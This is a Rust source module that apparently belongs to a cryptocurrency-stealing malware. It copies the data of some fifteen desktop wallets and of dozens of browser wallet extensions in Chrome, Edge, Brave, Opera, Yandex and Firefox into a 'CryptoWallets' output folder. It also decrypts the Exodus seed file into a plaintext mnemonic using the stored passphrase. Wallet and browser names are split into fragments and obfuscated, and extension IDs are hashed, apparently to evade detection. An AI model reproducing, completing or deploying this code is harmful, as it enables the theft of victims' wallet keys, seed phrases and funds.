use crate::fnv1a;

use std::collections::HashMap;
use std::fs;
use std::path::{Path, PathBuf};

struct BrowserInfo {
    name: String,
    profiles_path: PathBuf,
    extension_subdir: String,
}

fn g_appdata() -> Option<String> {
    std::env::var("APPDATA").ok()
}

fn g_local_appdata() -> Option<String> {
    std::env::var("LOCALAPPDATA").ok()
}

pub fn d_wallet_paths(appdata: &str, local_appdata: &str) -> HashMap<String, PathBuf> {
    if appdata.is_empty() || local_appdata.is_empty() {
        return HashMap::new();
    };

    let mut wallets = HashMap::new();

    let entries: Vec<(String, PathBuf)> = vec![
        (["Arm","ory"].concat(),    PathBuf::from(&appdata).join(["Arm","ory"].concat())),
        (["Ato","mic"].concat(),    PathBuf::from(&appdata).join(["Ato","mic"].concat()).join(["Local"," Stor","age"].concat()).join("leveldb")),
        (["Bit","coin"].concat(),   PathBuf::from(&appdata).join(["Bit","coin"].concat()).join("wallets")),
        (["Byte","coin"].concat(),  PathBuf::from(&appdata).join(["byte","coin"].concat())),
        (["Coin","omi"].concat(),   PathBuf::from(&local_appdata).join(["Coin","omi"].concat()).join(["Coin","omi"].concat()).join("wallets")),
        (["Da","sh"].concat(),      PathBuf::from(&appdata).join(["Dash","Core"].concat()).join("wallets")),
        (["Elect","rum"].concat(),  PathBuf::from(&appdata).join(["Elect","rum"].concat()).join("wallets")),
        (["Ether","eum"].concat(),  PathBuf::from(&appdata).join(["Ether","eum"].concat()).join("keystore")),
        (["Exo","dus"].concat(),    PathBuf::from(&appdata).join(["Exo","dus"].concat()).join(["exo","dus.wallet"].concat())),
        (["Gua","rda"].concat(),    PathBuf::from(&appdata).join(["Gua","rda"].concat()).join(["Local"," Stor","age"].concat()).join("leveldb")),
        (["Ja","xx"].concat(),      PathBuf::from(&appdata).join(["com.liberty",".jaxx"].concat()).join("IndexedDB").join(["file__0.indexed","db.leveldb"].concat())),
        (["Lite","coin"].concat(),  PathBuf::from(&appdata).join(["Lite","coin"].concat()).join("wallets")),
        (["My","Monero"].concat(),  PathBuf::from(&appdata).join(["My","Monero"].concat())),
        (["Mon","ero"].concat(),    PathBuf::from(&appdata).join(["Mon","ero"].concat())),
        (["Zca","sh"].concat(),     PathBuf::from(&appdata).join(["Zca","sh"].concat())),
    ];

    for (name, path) in entries {
        wallets.insert(name, path);
    }

    wallets
}

fn w_extension_hashes() -> HashMap<u64, String> {
    HashMap::from([
        (0xbedc3de67f763bb5_u64, ["Arg","ent X"].concat()),
        (0x9ea54d81fc7bb508, ["Bit","Keep Wallet"].concat()),
        (0xd1282138a4039d84, ["Block","Wallet"].concat()),
        (0x300fa2a5cacb4f8f, ["Coin","base"].concat()),
        (0xf7dfd91af2d17b39, ["Cry","pto.com"].concat()),
        (0x905579d2092973c3, ["Enk","rypt"].concat()),
        (0x322f7c9d9d410a42, ["Eth","os Sui"].concat()),
        (0x6176ca75d7f6cdcf, ["Exo","dusWeb3"].concat()),
        (0x96424154cfee37e3, ["Gua","rda"].concat()),
        (0x006fa782bda6f715, ["Math","Wallet"].concat()),
        (0xc2ea17e8592fc27d, ["O","KX"].concat()),
        (0x7f44314468afd658, ["One","Key"].concat()),
        (0xe4b1bd03e2327610, ["Ron","in"].concat()),
        (0xcf8e7641ea9e4c06, ["Safe","Pal"].concat()),
        (0x8c8c8fdeddaffc60, ["Token","Pocket"].concat()),
        (0xe50b39c55e993588, ["T","on"].concat()),
        (0xa21e436a586247fa, ["Wom","bat"].concat()),
        (0xc5fb8498bfe6fa93, ["Ze","al"].concat()),
        (0xe8a302502ef3f906, ["Bin","ance Smart Chain"].concat()),
        (0x1e5487a723ce7850, ["Authen","ticator"].concat()),
        (0x16e4ab42f00ecf88, ["Bin","ance"].concat()),
        (0x51b830494f5c3240, ["Bit","app"].concat()),
        (0x7fed23436f3f5fe3, ["Bolt","X"].concat()),
        (0x9d10989009aec467, ["Coin","98"].concat()),
        (0x47e9b1c1645f854e, ["Coin","base"].concat()),
        (0x137ae4d08bf6f3f2, ["Co","re"].concat()),
        (0xc287355d2521e08c, ["Croco","bit"].concat()),
        (0xa491cbb152094deb, ["Equ","al"].concat()),
        (0x7c725464001d8933, ["Ev","er"].concat()),
        (0xcfdff446cdfd5f5c, ["Few","cha"].concat()),
        (0xb44d24f20ce721ce, ["Fin","nie"].concat()),
        (0x390ce909ffb9b322, ["Gui","ld"].concat()),
        (0x32711ceca5e1ea3f, ["Harmony","Outdated"].concat()),
        (0x703bb6125cc7e233, ["Icon","ex"].concat()),
        (0xa97414166b2b61a8, ["Jaxx"," Lib","erty"].concat()),
        (0x25d47d752c74ea0e, ["Kai","kas"].concat()),
        (0x3f3a32ab9b337e0f, ["Kardia","Chain"].concat()),
        (0x4c1580a00b33e056, ["Kep","lr"].concat()),
        (0x9816529a52e1bb6a, ["Liqu","ality"].concat()),
        (0x297aef6f0abc59a1, ["MEW","CX"].concat()),
        (0x5148ee441e7e2a7b, ["Maiar","DEFI"].concat()),
        (0x0e47e28187ff1887, ["Mar","tian"].concat()),
        (0xe5dd02b5fffb8284, ["Meta","mask"].concat()),
        (0x92181ac5f8c53e6d, ["Meta","mask2"].concat()),
        (0x6d77fe5cb3c11d0c, ["Mo","box"].concat()),
        (0x472e6d2a990807e5, ["Na","mi"].concat()),
        (0xc94cf44273bf61ab, ["Nif","ty"].concat()),
        (0xdfa14e40f7364864, ["Oxy","gen"].concat()),
        (0xad3001cbc4a517d2, ["Pali","Wallet"].concat()),
        (0x29a93b17eeaed715, ["Pet","ra"].concat()),
        (0xcb776307d36fcde6, ["Phan","tom"].concat()),
        (0x25fe79b4e8402789, ["Pon","tem"].concat()),
        (0x31b759109bb2297d, ["Sat","urn"].concat()),
        (0xf542288366e0bc40, ["Slo","pe"].concat()),
        (0xb209e71ceed6ab5a, ["Sol","fare"].concat()),
        (0x909dec1cb4f88f45, ["Sol","let"].concat()),
        (0x7e5cbcb7be3754f2, ["Star","coin"].concat()),
        (0x41564f5d7e7f012d, ["Sw","ash"].concat()),
        (0xd9207df51f9035c0, ["Temple","Tezos"].concat()),
        (0x684d1905e64becc0, ["Terra","Station"].concat()),
        (0xe2e0e5e5d97d7cc4, ["Tr","on"].concat()),
        (0xea55b87c06a75797, ["Trust"," Wallet"].concat()),
        (0x30c1264baf146957, ["XD","EFI"].concat()),
        (0xc4b3877431d11333, ["XMR",".PT"].concat()),
        (0x91820b472938e2f3, ["Xin","Pay"].concat()),
        (0x6df1d213fbdd2e38, ["Yor","oi"].concat()),
        (0xe4ef5bdf10f73582, ["iWa","llet"].concat()),
        (0xedc4d5536e8bc147, ["Sen","der"].concat()),
    ])
}

fn c_browsers(appdata: &str, local_appdata: &str) -> Vec<BrowserInfo> {
    let ud = obfstr::obfstr!("User Data").to_string();
    let g = ["Goo","gle"].concat();
    let ms = ["Micro","soft"].concat();
    let bs = ["Brave","Software"].concat();
    let os = ["Opera ","Soft","ware"].concat();
    let yn = ["Yan","dex"].concat();
    vec![
        BrowserInfo {
            name: ["Chr","ome"].concat(),
            profiles_path: PathBuf::from(&local_appdata).join(&g).join(["Chr","ome"].concat()).join(&ud),
            extension_subdir: "Extensions".to_string(),
        },
        BrowserInfo {
            name: ["Chr","ome Beta"].concat(),
            profiles_path: PathBuf::from(&local_appdata).join(&g).join(["Chr","ome Beta"].concat()).join(&ud),
            extension_subdir: "Extensions".to_string(),
        },
        BrowserInfo {
            name: ["Chr","ome SxS"].concat(),
            profiles_path: PathBuf::from(&local_appdata).join(&g).join(["Chr","ome SxS"].concat()).join(&ud),
            extension_subdir: "Extensions".to_string(),
        },
        BrowserInfo {
            name: "Edge".to_string(),
            profiles_path: PathBuf::from(&local_appdata).join(&ms).join("Edge").join(&ud),
            extension_subdir: "Extensions".to_string(),
        },
        BrowserInfo {
            name: ["Bra","ve"].concat(),
            profiles_path: PathBuf::from(&local_appdata).join(&bs).join(["Brave","-Browser"].concat()).join(&ud),
            extension_subdir: "Extensions".to_string(),
        },
        BrowserInfo {
            name: ["Ope","ra"].concat(),
            profiles_path: PathBuf::from(&appdata).join(&os).join(["Opera"," Stable"].concat()),
            extension_subdir: "Extensions".to_string(),
        },
        BrowserInfo {
            name: ["Opera"," GX"].concat(),
            profiles_path: PathBuf::from(&appdata).join(&os).join(["Opera ","GX Stable"].concat()),
            extension_subdir: "Extensions".to_string(),
        },
        BrowserInfo {
            name: ["Viv","aldi"].concat(),
            profiles_path: PathBuf::from(&local_appdata).join(["Viv","aldi"].concat()).join(&ud),
            extension_subdir: "Extensions".to_string(),
        },
        BrowserInfo {
            name: ["Chrom","ium"].concat(),
            profiles_path: PathBuf::from(&local_appdata).join(["Chrom","ium"].concat()).join(&ud),
            extension_subdir: "Extensions".to_string(),
        },
        BrowserInfo {
            name: ["Yan","dex"].concat(),
            profiles_path: PathBuf::from(&local_appdata).join(&yn).join(["Yandex","Browser"].concat()).join(&ud),
            extension_subdir: "Extensions".to_string(),
        },
    ]
}

fn g_chromium_profiles(user_data_path: &Path) -> Vec<PathBuf> {
    let mut profiles = Vec::new();

    let default = user_data_path.join("Default");
    if default.exists() {
        profiles.push(default);
    }

    if let Ok(entries) = fs::read_dir(user_data_path) {
        for entry in entries.flatten() {
            let name = entry.file_name();
            let name_str = name.to_string_lossy();
            if name_str.starts_with("Profile ") && entry.path().is_dir() {
                profiles.push(entry.path());
            }
        }
    }

    profiles
}

fn c_dir_recursive(src: &Path, dst: &Path) -> std::io::Result<u64> {
    let mut total_bytes = 0u64;

    if !dst.exists() {
        fs::create_dir_all(dst)?;
    }

    for entry in fs::read_dir(src)? {
        let entry = entry?;
        let file_type = entry.file_type()?;
        let src_path = entry.path();
        let dst_path = dst.join(entry.file_name());

        if file_type.is_dir() {
            total_bytes += c_dir_recursive(&src_path, &dst_path)?;
        } else if file_type.is_file() {
            if let Ok(meta) = fs::metadata(&src_path) {
                if meta.len() > 50 * 1024 * 1024 {
                    continue;
                }
                total_bytes += meta.len();
            }
            let _ = fs::copy(&src_path, &dst_path);
        }
    }

    Ok(total_bytes)
}

pub struct WalletGrabResult {
    pub desktop_wallets: Vec<String>,
    pub browser_extensions: Vec<String>,
    pub total_bytes: u64,
    pub exodus_mnemonic: Option<String>,
}

pub fn g_desktop_wallets(output_dir: &Path) -> (Vec<String>, Option<String>) {
    let mut found = Vec::new();
    let appdata = match g_appdata() {
        Some(p) => p,
        None => return (Vec::new(), None),
    };
    let local_appdata = match g_local_appdata() {
        Some(p) => p,
        None => return (Vec::new(), None),
    };
    let wallets = d_wallet_paths(&appdata, &local_appdata);
    let dest_base = output_dir.join("CryptoWallets").join("Desktop");

    for (name, path) in &wallets {
        if path.exists() {
            let dest = dest_base.join(name);
            if c_dir_recursive(path, &dest).is_ok() {
                found.push(name.to_string());
            }
        }
    }

    let exodus_mnemonic = t_decrypt_exodus(&wallets, &dest_base);

    (found, exodus_mnemonic)
}

fn t_decrypt_exodus(wallets: &std::collections::HashMap<String, PathBuf>, dest_base: &Path) -> Option<String> {
    let exodus_key = ["Exo", "dus"].concat();
    let wallet_path = wallets.get(&exodus_key)?;
    if !wallet_path.exists() {
        return None;
    }

    let pp_path = wallet_path.join("passphrase.json");
    let password = if pp_path.exists() {
        let raw = std::fs::read_to_string(&pp_path).ok()?;
        if let Ok(obj) = serde_json::from_str::<serde_json::Value>(&raw) {
            obj.get("passphrase")
                .and_then(|v| v.as_str())
                .map(|s| s.to_string())
                .unwrap_or_else(|| raw.trim().to_string())
        } else {
            raw.trim().to_string()
        }
    } else {
        return None;
    };

    if password.is_empty() {
        return None;
    }

    let seed_path = wallet_path.join("seed.seco");
    let seed_data = std::fs::read(&seed_path).ok()?;

    let mnemonic = kurion_crypto::seco::d_seco(&seed_data, &password).ok()?;

    let mnemonic_file = dest_base.join(&exodus_key).join("decrypted_mnemonic.txt");
    let _ = std::fs::write(&mnemonic_file, mnemonic.as_bytes());

    Some(mnemonic)
}

pub fn g_browser_extensions(output_dir: &Path) -> Vec<String> {
    let mut found = Vec::new();
    let known_hashes = w_extension_hashes();
    let local_appdata = match g_local_appdata() {
        Some(p) => p,
        None => return Vec::new(),
    };
    let appdata = match g_appdata() {
        Some(p) => p,
        None => return Vec::new(),
    };
    let browsers = c_browsers(&appdata, &local_appdata);
    let dest_base = output_dir.join("CryptoWallets").join("Extensions");

    for browser in browsers {
        if !browser.profiles_path.exists() {
            continue;
        }

        let profiles = g_chromium_profiles(&browser.profiles_path);

        for profile_path in &profiles {
            let ext_dir = profile_path.join(&browser.extension_subdir);
            if !ext_dir.exists() {
                continue;
            }

            let profile_name = profile_path
                .file_name()
                .unwrap_or_default()
                .to_string_lossy()
                .to_string();

            if let Ok(entries) = fs::read_dir(&ext_dir) {
                for entry in entries.flatten() {
                    if !entry.path().is_dir() {
                        continue;
                    }
                    let dir_name = entry.file_name();
                    let ext_id = dir_name.to_string_lossy();
                    let hash = fnv1a(ext_id.as_bytes());

                    if let Some(wallet_name) = known_hashes.get(&hash) {
                        let label = format!("{} - {} ({})", browser.name, wallet_name, profile_name);
                        let dest = dest_base.join(&browser.name).join(&profile_name).join(wallet_name);

                        if c_dir_recursive(&entry.path(), &dest).is_ok() {
                            found.push(label);
                        }
                    }
                }
            }
        }
    }

    g_firefox_extensions(output_dir, &known_hashes, &mut found);

    found
}

fn g_firefox_extensions(output_dir: &Path, known_hashes: &HashMap<u64, String>, found: &mut Vec<String>) {
    let appdata = match g_appdata() {
        Some(p) => p,
        None => return,
    };

    let firefox_profiles = PathBuf::from(&appdata).join("Mozilla\\Firefox\\Profiles");
    if !firefox_profiles.exists() {
        return;
    }

    let profiles = match fs::read_dir(&firefox_profiles) {
        Ok(p) => p,
        Err(_) => return,
    };

    let dest_base = output_dir.join("CryptoWallets").join("Extensions").join("Firefox");

    for profile_entry in profiles.flatten() {
        if !profile_entry.path().is_dir() {
            continue;
        }

        let profile_name = profile_entry.file_name().to_string_lossy().to_string();

        let ext_dir = profile_entry.path().join("extensions");
        if !ext_dir.exists() {
            continue;
        }

        if let Ok(ext_entries) = fs::read_dir(&ext_dir) {
            for ext_entry in ext_entries.flatten() {
                let ext_name = ext_entry.file_name().to_string_lossy().to_string();

                let hash = fnv1a(ext_name.as_bytes());
                let name_no_ext = ext_name.trim_end_matches(".xpi");
                let hash_no_ext = fnv1a(name_no_ext.as_bytes());

                let wallet_name = known_hashes.get(&hash)
                    .or_else(|| known_hashes.get(&hash_no_ext));

                if let Some(wallet_name) = wallet_name {
                    let label = format!("Firefox - {} ({})", wallet_name, profile_name);
                    let dest = dest_base.join(&profile_name).join(wallet_name);

                    if ext_entry.path().is_dir() {
                        let _ = c_dir_recursive(&ext_entry.path(), &dest);
                    } else {
                        let _ = fs::create_dir_all(&dest);
                        let _ = fs::copy(ext_entry.path(), dest.join(&ext_name));
                    }
                    found.push(label);
                }
            }
        }

        let storage_dirs = ["storage", "webextensions", "browser-extension-data"];
        for storage_name in &storage_dirs {
            let storage_path = profile_entry.path().join(storage_name);
            if storage_path.exists() {
                if let Ok(entries) = fs::read_dir(&storage_path) {
                    for entry in entries.flatten() {
                        let entry_name = entry.file_name().to_string_lossy().to_string();
                        let hash = fnv1a(entry_name.as_bytes());
                        let name_no_ext = entry_name.trim_end_matches(".xpi");
                        let hash_no_ext = fnv1a(name_no_ext.as_bytes());

                        let wallet_name = known_hashes.get(&hash)
                            .or_else(|| known_hashes.get(&hash_no_ext));

                        if let Some(wallet_name) = wallet_name {
                            let dest = dest_base.join(&profile_name)
                                .join(format!("{}_storage", wallet_name));
                            let _ = c_dir_recursive(&entry.path(), &dest);
                        }
                    }
                }
            }
        }
    }
}

pub fn g_wallets(output_dir: &Path) -> WalletGrabResult {
    let (desktop_wallets, exodus_mnemonic) = g_desktop_wallets(output_dir);
    let browser_extensions = g_browser_extensions(output_dir);

    let total_bytes = d_size(&output_dir.join("CryptoWallets").join("Desktop"))
        + d_size(&output_dir.join("CryptoWallets").join("Extensions"));

    WalletGrabResult {
        desktop_wallets,
        browser_extensions,
        total_bytes,
        exodus_mnemonic,
    }
}

fn d_size(path: &Path) -> u64 {
    if !path.exists() {
        return 0;
    }
    let mut size = 0u64;
    if let Ok(entries) = fs::read_dir(path) {
        for entry in entries.flatten() {
            let ft = entry.file_type().unwrap_or_else(|_| unreachable!());
            if ft.is_file() {
                size += entry.metadata().map(|m| m.len()).unwrap_or(0);
            } else if ft.is_dir() {
                size += d_size(&entry.path());
            }
        }
    }
    size
}
